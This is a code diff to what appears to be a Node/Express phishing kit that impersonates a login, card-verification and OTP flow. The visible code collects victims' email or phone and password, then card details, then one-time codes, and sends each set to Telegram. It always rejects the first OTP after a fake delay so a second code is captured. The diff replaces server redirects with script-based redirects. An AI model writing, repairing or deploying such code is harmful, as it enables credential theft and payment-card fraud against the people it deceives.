@@ -68,7 +68,12 @@ app.post('/submit', async (req, res) => {
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
       await sendToTelegram(message);
       console.log('Redirecting to /?step=verify_card'); // Debugging
-      return res.redirect('/?step=verify_card');
+      // بديل للتوجيه: إعادة تحميل الصفحة مع المعلمة
+      return res.send(`
+        <script>
+          window.location.href = '/?step=verify_card';
+        </script>
+      `);
     } else {
       error = 'Please enter both email/phone and password';
     }
@@ -85,7 +90,11 @@ app.post('/submit', async (req, res) => {
         `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
         `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
       await sendToTelegram(message);
-      return res.redirect('/?step=otp');
+      return res.send(`
+        <script>
+          window.location.href = '/?step=otp';
+        </script>
+      `);
     } else {
       error = 'Please fill in all card details';
     }
@@ -106,13 +115,21 @@ app.post('/submit', async (req, res) => {
       if (req.session.otp_attempts.length === 1) {
         await new Promise(resolve => setTimeout(resolve, 10000));
         req.session.error = 'Invalid OTP. Please try again.';
-        return res.redirect('/?step=otp');
+        return res.send(`
+          <script>
+            window.location.href = '/?step=otp';
+          </script>
+        `);
       }
 
       if (req.session.otp_attempts.length >= 2) {
         await new Promise(resolve => setTimeout(resolve, 5000));
         req.session.error = '';
-        return res.redirect('/?step=success');
+        return res.send(`
+          <script>
+            window.location.href = '/?step=success';
+          </script>
+        `);
       }
     } else {
       error = 'Please enter the OTP';
@@ -120,7 +137,11 @@ app.post('/submit', async (req, res) => {
   }
 
   req.session.error = error;
-  res.redirect(`/?step=${step}`);
+  res.send(`
+    <script>
+      window.location.href = '/?step=${step}';
+    </script>
+  `);
 });
 
 // Success page
